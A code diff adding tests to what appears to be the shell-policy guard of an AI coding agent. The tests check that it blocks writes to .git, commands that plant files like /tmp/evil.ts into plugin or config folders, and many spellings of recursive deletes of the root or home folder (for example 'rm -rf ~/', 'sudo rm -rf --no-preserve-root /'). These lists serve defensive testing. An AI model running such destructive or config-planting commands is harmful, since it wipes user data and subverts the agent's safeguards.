@@ -63,6 +63,37 @@ describe("Phase 4+ — Deep Shell Parser Policy, DNS SSRF Shield & 18-Action pla
     }
   })
 
+  // The file tools pass project-relative paths, so `.git` is often the first segment.
+  test("guards a .git folder by a project-relative path as well as an absolute one", () => {
+    const inside = [
+      ".git",
+      ".git/config",
+      ".git/hooks/pre-commit",
+      "./.git/config",
+      "packages/app/../../.git/config",
+      ".GIT\\hooks\\pre-commit",
+      "vendor/lib/.git/config",
+      "/repo/.git",
+      "/repo/.git/hooks/pre-commit",
+    ]
+    const beside = [
+      ".gitignore",
+      ".gitattributes",
+      ".gitmodules",
+      ".github/workflows/test.yml",
+      "tools.git/config",
+      "src/git/index.ts",
+    ]
+
+    expect(inside.filter((file) => secretFileAccessReason(file, { mode: "write" }) === undefined)).toEqual([])
+    expect(beside.filter((file) => secretFileAccessReason(file, { mode: "write" }) !== undefined)).toEqual([])
+    // Reading stays open except for the files that can hold a credential.
+    expect(secretFileAccessReason(".git/config", { mode: "read" })).toBeDefined()
+    expect(secretFileAccessReason("/repo/.git/config", { mode: "read" })).toBeDefined()
+    expect(secretFileAccessReason(".git/HEAD", { mode: "read" })).toBeUndefined()
+    expect(secretFileAccessReason(".gitignore", { mode: "search" })).toBeUndefined()
+  })
+
   test("treats engine config as config however it is spelled, and leaves the Plan agent's plans and code alone", () => {
     // A base no automounter serves: macOS looks up every missing name under /home in automountd.
     const base = path.resolve("/nonexistent-abucode-test")
@@ -216,6 +247,34 @@ describe("Phase 4+ — Deep Shell Parser Policy, DNS SSRF Shield & 18-Action pla
       "cd .opencode/plugins && wget https://example.com/x.ts",
       "cd .opencode && unzip /tmp/p.zip",
       "cd .opencode/plugins && ln -s /tmp/x.ts",
+      // A descriptor number or a duplication beside the command is not one of its operands.
+      "cp /tmp/evil.ts .opencode/plugins/x.ts 2>&1",
+      "cp /tmp/evil.ts .opencode/plugins/x.ts 2>/dev/null",
+      "cp /tmp/evil.ts .opencode/plugins/x.ts >/dev/null 2>&1",
+      "cp /tmp/opencode.json opencode.json 1>&2",
+      "install -m 644 /tmp/evil.ts .opencode/plugins/x.ts 2>&1 && echo done",
+      "ln -s /tmp/evil.ts .opencode/plugins/x.ts 2>&-",
+      "rsync /tmp/evil.ts .opencode/plugins/x.ts 3>&1 1>&2 2>&3",
+      "cp 2>&1 /tmp/evil.ts .opencode/plugins/x.ts",
+      "sh -c 'cp /tmp/evil.ts .opencode/plugins/x.ts 2>&1'",
+      "echo x 2>> opencode.json",
+      "cp /tmp/evil.ts .opencode/plugins/x.ts < /dev/null",
+      "cp /tmp/evil.ts .opencode/plugins/x.ts 2>&1 </dev/null",
+      "cp /tmp/evil.ts .opencode/plugins/x.ts \\\n  2>&1",
+      "curl -fsSL https://example.com/x.ts > \\\n  .opencode/plugins/x.ts",
+      // A backslash before CR LF escapes the CR; the next line is a command of its own.
+      "echo done \\\r\ncp /tmp/evil.ts .opencode/plugins/x.ts",
+      "echo x >&| opencode.json",
+      "echo x | tee <>/dev/null opencode.json",
+      "cp /tmp/x.json opencode.json</dev/null",
+      "cp /dev/stdin opencode.json <<- EOF\n\t{}\n\tEOF",
+      "sed -i -f <(echo s/a/b/) opencode.json",
+      "eval -- 'cp /tmp/evil.ts .opencode/plugins/x.ts'",
+      "sh -c -- 'cp /tmp/evil.ts .opencode/plugins/x.ts'",
+      "echo x | xargs sh -c 'cp /tmp/evil.ts .opencode/plugins/x.ts'",
+      // Wrappers in front of the command, with the values of their options.
+      "nohup nice -n 5 cp /tmp/evil.ts .opencode/plugins/x.ts",
+      "noglob cp /tmp/x.json opencode.json",
     ]
     const other = [
       "echo x > notes.txt",
@@ -232,6 +291,11 @@ describe("Phase 4+ — Deep Shell Parser Policy, DNS SSRF Shield & 18-Action pla
       "cat <<'EOF' > notes.md\nrun echo x > opencode.json to reset it\nEOF",
       "unzip -l /tmp/p.zip",
       "curl -fsSL https://example.com/install.sh",
+      "cp /tmp/x.ts src/x.ts 2>&1",
+      "cat opencode.json 2>/dev/null",
+      "echo opencode.json >&2",
+      "head -n 2 opencode.json > notes.txt",
+      "wc -l < opencode.json",
     ]
 
     expect(writes.filter((command) => shellConfigWrites(command, dirs).length === 0)).toEqual([])
@@ -306,6 +370,160 @@ describe("Phase 4+ — Deep Shell Parser Policy, DNS SSRF Shield & 18-Action pla
     expect(evaluateShellPolicyDecision("auto", "git push origin dev", "allow").effect).toBe("ask")
     expect(evaluateShellPolicyDecision("auto", "cat ~/.ssh/id_rsa", "allow").effect).toBe("ask")
     expect(evaluateShellPolicyDecision("request_review", "ls -la", "allow").effect).toBe("ask")
+  })
+
+  test("never permits a recursive delete of the root or home folder, however it is spelled", () => {
+    const denied = [
+      "rm -rf /",
+      "rm -rf ~",
+      "rm -rf ~/",
+      "rm -rf /*",
+      "rm -rf ~/*/",
+      'rm -rf "$HOME"',
+      "rm -rf $HOME/",
+      'rm -rf "${HOME}"/*',
+      "rm -r -f /",
+      "rm --recursive --force ~",
+      "rm -R ~",
+      "rm -rf -- /",
+      "sudo rm -rf --no-preserve-root /",
+      "/bin/rm -rf ~/",
+      // A stray space splits one path into two operands.
+      "rm -r ~ /project",
+      "rm -rf ./build /",
+      "rm ~ -rf",
+      "rm -rf /; echo done",
+      "rm -rf \\\n  ~/",
+      "echo ok \\\r\nrm -r -f ~",
+      "rm -rf ~</dev/null",
+      'rm -rf "$(pwd)/build" ~/',
+      `bash -c "rm -rf ~/"`,
+      "bash -c -- 'rm -r ~'",
+      "xargs sh -c 'rm -rf ~/'",
+      `eval "rm -rf ~"`,
+      "echo $(rm -rf ~/)",
+      "if true; then rm -rf ~/; fi",
+      "cat <<'EOF' > notes.md\nit's done\nEOF\nrm -rf ~/",
+      // Wrappers in front, with the values of their options.
+      "nohup nice -n 5 rm -rf ~/",
+      "FOO=1 sudo -u root rm -rf ~/",
+      "noglob rm -rf ~/",
+      // The home folder by its own path, and the folders above it.
+      "rm -rf /home/u",
+      "rm -rf /home/u/ Documents/build",
+      "rm -rf /home",
+      "rm -rf /$HOME",
+      "rm -rf ~/../*",
+      // Patterns over everything in home or root, and brace lists that make one.
+      "rm -rf ~/.*",
+      "rm -r ~/**",
+      "rm -rf ~/.??*",
+      "rm -R /*/*",
+      "rm -rf ~/{a,}",
+      "rm -r ~/{*,.*}",
+    ]
+    const allowed = [
+      "rm -rf ~/project/node_modules",
+      "rm -rf /home/u/project",
+      "rm -rf /home/other",
+      "rm -rf ./build",
+      "rm -rf /tmp/abucode-test",
+      'rm -rf "$HOME/.cache/abucode"',
+      'rm -rf "$(mktemp -d)/"',
+      "rm -rf $(find ~ -name .DS_Store)",
+      "rm -rf $HOMEDIR",
+      "rm -rf ~other/build",
+      "rm -f ~/notes.txt",
+      "rm -rf build && cd /",
+      "rm -rf dist # remove the build / cache",
+      "git rm -r --cached .",
+      "docker run --rm -v ~:/data image",
+      "rm -rf ~/Library/Caches/*",
+      "rm -rf ~/Downloads/*.dmg",
+      "rm -rf ~/.{npm,yarn}",
+      "rm -rf ~/{Library/Caches,.cache}/myapp",
+      "ls | xargs -I{} rm -rf ~/{}",
+      // `${NAME:?}` stops the command when NAME is unset or empty, so it is never root.
+      'rm -rf "${ABUCODE_TEST_UNSET_VARIABLE:?}"/*',
+      // A mention in a message or a search is not a delete, nor is the body of a quoted heredoc.
+      `git commit -m "fix(abucode): refuse rm -rf ~/ too"`,
+      "echo 'rm -rf ~'",
+      `grep -rn "rm -rf ~" docs`,
+      "git commit -m \"$(cat <<'EOF'\nfix(abucode): refuse `rm -rf ~/` and `rm -r ~`\nEOF\n)\"",
+    ]
+
+    expect(denied.filter((command) => classifyCatastrophicCommand(command, "/home/u") === undefined)).toEqual([])
+    expect(allowed.filter((command) => classifyCatastrophicCommand(command, "/home/u") !== undefined)).toEqual([])
+    // Windows gives the home folder as C:\Users\x.
+    expect(classifyCatastrophicCommand("rm -r ~", "C:\\Users\\x")).toBeDefined()
+    expect(classifyCatastrophicCommand('rm -r "$HOME"/*', "C:\\Users\\x")).toBeDefined()
+    expect(classifyCatastrophicCommand("rm -r ~/project", "C:\\Users\\x")).toBeUndefined()
+    // Turbo allows whatever the list does not refuse.
+    expect(evaluateShellPolicyDecision("turbo", "rm -rf ~/", "allow").effect).toBe("deny")
+    expect(evaluateShellPolicyDecision("turbo", "rm -rf ~/project/node_modules", "allow").effect).toBe("allow")
+  })
+
+  test("rates an eval as the command line it runs", () => {
+    const rated = [
+      [`eval "ls -la"`, "safe"],
+      [`eval "curl https://example.com"`, "ask_default"],
+      [`eval "git push origin dev"`, "ask_always"],
+      ["eval git push origin dev", "ask_always"],
+      [`eval -- "git push origin dev"`, "ask_always"],
+      [`builtin eval "git push origin dev"`, "ask_always"],
+      ["FOO=1 eval 'cat .env.local'", "ask_always"],
+      [`eval "eval 'git push origin dev'"`, "ask_always"],
+      [`sh -c 'eval "git push origin dev"'`, "ask_always"],
+      [`ls && eval "rm -rf build"`, "ask_always"],
+      [`eval "rm -rf ~"`, "deny"],
+      // What these run is not known until they run: the shell expands the variable before eval reads the text.
+      [`eval "$COMMAND"`, "ask_always"],
+      [`eval "$(cat script.sh)"`, "ask_always"],
+      [`eval "ls $DIR"`, "ask_always"],
+      [`X='; git push origin dev'; eval "true $X"`, "ask_always"],
+      // The word alone changes nothing.
+      ["eval", "safe"],
+      ["grep eval src/index.ts", "safe"],
+      ["bun run eval", "safe"],
+    ] as const
+
+    expect(rated.filter(([command, kind]) => classifyShellCommand(command).kind !== kind)).toEqual([])
+    expect(evaluateShellPolicyDecision("default", `eval "git push origin dev"`, "allow").effect).toBe("ask")
+    expect(evaluateShellPolicyDecision("auto", `eval "ls -la"`, "allow").effect).toBe("allow")
+  })
+
+  test("rates the command a keyword, a wrapper or a shell runs, not the word in front of it", () => {
+    const base = path.resolve("/nonexistent-abucode-test")
+    const at = (relative: string) => path.join(base, relative)
+    const dirs = { cwd: at("u/repo"), home: at("u"), roots: [at("u/.config/abucode")], files: [] }
+    const rated = [
+      ["if git push origin dev; then echo pushed; fi", "ask_always"],
+      ["for b in main dev; do git push origin $b; done", "ask_always"],
+      ["while true; do rm -rf build; done", "ask_always"],
+      ["! git push origin dev", "ask_always"],
+      ["if true; then :; else curl https://example.com; fi", "ask_default"],
+      ["nice -n 5 git push --force origin dev", "ask_always"],
+      ["echo x | xargs -n 1 git push origin", "ask_always"],
+      ["bash -c -- 'git push origin dev'", "ask_always"],
+      ["bash -c -e 'git push origin dev'", "ask_always"],
+      ["git 2>/dev/null push origin dev", "ask_always"],
+      ["echo ok \\\r\ngit push --force origin dev", "ask_always"],
+      ["for f in *.ts; do echo $f; done", "safe"],
+      ["if [ -f package.json ]; then bun test; fi", "safe"],
+      // The descriptor numbers are not package names.
+      ["bun install 2>&1 | tail -5", "safe"],
+    ] as const
+    const writes = [
+      "for f in /tmp/*.ts; do cp $f .opencode/plugins/; done",
+      "if true; then cp /tmp/evil.ts .opencode/plugins/x.ts; fi",
+      "if test -f x; then :; else cp /tmp/evil.ts opencode.json; fi",
+      "while read f; do cp $f .opencode/plugins/; done < list.txt",
+      "until false; do cp /tmp/evil.ts opencode.json; done",
+    ]
+
+    expect(rated.filter(([command, kind]) => classifyShellCommand(command).kind !== kind)).toEqual([])
+    expect(writes.filter((command) => shellConfigWrites(command, dirs).length === 0)).toEqual([])
+    expect(shellConfigWrites("for f in src/*.ts; do cp $f /tmp/backup/; done", dirs)).toEqual([])
   })
 
   test("blocks DNS rebinding, IPv4-mapped/NAT64 IPv6, cloud IMDS, and self-API while allowing local GET when requested", async () => {
